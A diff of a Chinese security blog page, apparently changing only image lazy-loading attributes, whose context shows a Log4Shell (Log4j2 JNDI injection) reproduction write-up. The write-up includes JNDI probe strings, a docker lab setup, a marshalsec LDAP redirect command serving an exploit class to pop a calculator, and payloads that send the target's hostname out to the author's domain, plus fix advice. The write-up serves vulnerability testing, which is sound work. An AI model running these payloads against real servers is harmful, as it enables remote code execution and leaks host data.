@@ -71,7 +71,7 @@ Apache Log4j2是一款优秀的Java日志框架。近日，漏洞银行安全团
     https://www.cnblogs.com/skins/CodingLife/images/title-yellow.png)">
     <div class="main-header-box">
         <a class="header-avatar" href="/" title="K8gege">
-            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" data-original="/../images/avatar.png">
+            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" class="lazyload" data-src="/../images/avatar.png">
 			<h3 class="K8tilte">K8哥哥</h3>
         </a>
         <div class="branding">
@@ -200,7 +200,7 @@ Apache Log4j2是一款优秀的Java日志框架。近日，漏洞银行安全团
     </div>
     
     <div class="post-body post-content">
-        <p><img alt="使用http访问查看图片" data-original="/k8img/posts/log4j/log4shell_1.PNG"></p>
+        <p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/posts/log4j/log4shell_1.PNG"></p>
 <h3 id="漏洞简介">漏洞简介</h3>
 <p>Apache Log4j2是一款优秀的Java日志框架。近日，漏洞银行安全团队注意到了Apache Log4j2远程代码执行漏洞。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。</p>
 <h3 id="漏洞原理">漏洞原理</h3>
@@ -217,21 +217,21 @@ Apache Log4j2是一款优秀的Java日志框架。近日，漏洞银行安全团
 <h3 id="漏洞复现1">漏洞复现1</h3>
 <p>启用Ladon的web监听，编译执行Poc项目，可看到Ladon回显目标IP以及提交的数据，Ldap出现一些特殊符号，最明显的是几个笑脸，Rmi回显前几个字符串为JRMI，回显以下特征说明目标存在jdni注入漏洞。</p>
 <figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon web 800</span><br></pre></td></tr></tbody></table></figure>
-<p><img alt="使用http访问查看图片" data-original="/k8img/posts/log4j/log4shell_2.PNG"></p>
+<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/posts/log4j/log4shell_2.PNG"></p>
 <p>其实也不是非要jndi来远程测试漏洞，log4j也支持java获取信息环境变量等，本地APP需要测试还好，实战是盲测，不像本地可以后台看，实战你只能外带，所以才用到jndi协议，有些人问为什么不用其它协议，因为受漏洞限制只能jndi协议，利用你就得看jndi支持什么协议，你才能利用什么协议。如以下代码，编译项目执行，会输出版本和操作系统信息。</p>
 <figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logger.error(<span class="string">"<span class="variable">${java:version}</span>/<span class="variable">${java:os}</span>"</span>);</span><br></pre></td></tr></tbody></table></figure>
 <p>也可使用以下协议探测</p>
 <figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">${jndi:ldap:/}</span></span><br><span class="line"><span class="variable">${jndi:ldaps:/}</span></span><br><span class="line"><span class="variable">${jndi:rmi:/}</span></span><br><span class="line"><span class="variable">${jndi:dns:/}</span></span><br><span class="line"><span class="variable">${jndi:iiop:/}</span></span><br></pre></td></tr></tbody></table></figure>
-<p><img alt="使用http访问查看图片" data-original="/k8img/posts/log4j/log4shell_3.PNG"></p>
+<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/posts/log4j/log4shell_3.PNG"></p>
 <h3 id="漏洞环境2">漏洞环境2</h3>
 <p>使用docker搭建环境，这样可模拟从内网另一台机来攻击该机器</p>
 <p>docker pull vulfocus/log4j2-rce-2021-12-09:latest</p>
 <h3 id="启动环境2">启动环境2</h3>
 <p>docker run -d -P vulfocus/log4j2-rce-2021-12-09:latest</p>
-<p><img alt="使用http访问查看图片" data-original="/k8img/posts/log4j/log4shell_4.PNG"></p>
+<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/posts/log4j/log4shell_4.PNG"></p>
 <h3 id="漏洞复现2">漏洞复现2</h3>
 <p>由于不知道漏洞触发点，使用LadonExp.exe盲测，发现注入点为Accept参数,测试方法所有参数均填写payload，目标URL填写需要测试的站点，点击Build_Exe，然后点击Test_exe测试即可。</p>
-<p><img alt="使用http访问查看图片" data-original="/k8img/posts/log4j/log4shell_5.PNG"></p>
+<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/posts/log4j/log4shell_5.PNG"></p>
 <p>改成rmi协议时，发现无法触发，于是看了下环境的JDK版本，发现是292的，JDK1.8 191起默认不支持RMI协议，所以用rmi测试失败。</p>
 <figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@4e4424eccb8d:/demo# java -version</span><br><span class="line">openjdk version <span class="string">"1.8.0_292"</span></span><br><span class="line">OpenJDK Runtime Environment (build 1.8.0_292-8u292-b10-0ubuntu1~18.04-b10)</span><br><span class="line">OpenJDK 64-Bit Server VM (build 25.292-b10, mixed mode)</span><br></pre></td></tr></tbody></table></figure>
 <h5 id="以下协议自行测试">以下协议自行测试</h5>
@@ -249,7 +249,7 @@ Apache Log4j2是一款优秀的Java日志框架。近日，漏洞银行安全团
 <h3 id="启动Ladp服务器">启动Ladp服务器</h3>
 <figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="string">"http://192.168.250.83:800/#Exploit"</span></span><br></pre></td></tr></tbody></table></figure>
 <p>将漏洞复现1的POC代码修改，指向我们的ldap服务器，编译执行弹出calc</p>
-<p><img alt="使用http访问查看图片" data-original="/k8img/posts/log4j/log4shell.gif"></p>
+<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/posts/log4j/log4shell.gif"></p>
 <h3 id="Payload">Payload</h3>
 <figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">${jndi:ldap://<span class="variable">${hostName}</span>.log4shell.k8gege.org}</span></span><br><span class="line"><span class="variable">${jndi:rmi://<span class="variable">${hostName}</span>.log4shell.k8gege.org}</span></span><br></pre></td></tr></tbody></table></figure>
 <h3 id="Ladon监听">Ladon监听</h3>
@@ -276,7 +276,7 @@ JDK版本限制，jdk8u191之后RMI和LDAP默认不能从远程加载类
 <p>PS: 该漏洞说大影响大嘛也是真的非常大，但说它鸡肋也鸡肋，因为我的目标就没一个成功的，或许存在洞的机器早已通过其它洞拿下，</p>
 <h3 id="有些人问为什么不用dnslog？">有些人问为什么不用dnslog？</h3>
 <p>你喜欢用dnslog的话也可以，没什么问题，只是这几天这洞玩的人太多，dnslog经常卡死，无法使用，这是第一个原因。其次使用dnslog，意味着我们的目标或者说正在测试只有内部人知道公司某些服务器使用log4j，若是别人也随机到和你相同的域名，你们公司存在漏洞的站点IP泄露出去，会是什么后果？使用自己的VPS来搭建的接收器才是最安全的，当然ldap或rmi协议出不来的话，就只能用dnslog来接收dns协议，因为Ladon无法监听DNS协议，当然要是你要时间也可以完全自己搭个DNS服务器还接收。</p>
-<p><img alt="使用http访问查看图片" data-original="/k8img/posts/log4j/log4shell_6.PNG"></p>
+<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/posts/log4j/log4shell_6.PNG"></p>
 <h3 id="为什么Ladon能监听LDAP、RMI？">为什么Ladon能监听LDAP、RMI？</h3>
 <p>为什么ldap、rmi、http等协议Ladon可以监听到，因为它们本身就是特殊的tcp协议，所以Ladon当然能捕获到。初中有没学过正方形是特殊的长方形，就是说你把正方形说成长方形也没错，Ladon虽然主要只是解析HTTP协议，但也没完全对其它协议进行丢弃，只要对前面部份数据16进制原样解析还是会看到一些明显的字眼如JRMI协议，所以Ladon对于一些非HTTP协议也可以从控制台看出来，同理以后其它无回显漏洞也可以使用Ladon监听，之前我也发过3篇文章，Linux无回显渗透、Java无回显渗透、PowerShell等，大家一定要学会举一反三，不要非要等别人告诉你，你才知道在这种场景也能用。</p>
 <h3 id="漏洞修复">漏洞修复</h3>
@@ -304,7 +304,7 @@ PowerLadon: <a target="_blank" rel="noopener" href="https://github.com/k8gege/Po
     
     <div class="reward" ontouchstart="">
     <div class="reward-wrap">
-	<img height="180" width="180" data-original="../images/k8join2.png">
+	<img height="180" width="180" class="lazyload" data-src="../images/k8join2.png">
 
     </div>
     <p class="reward-tip">
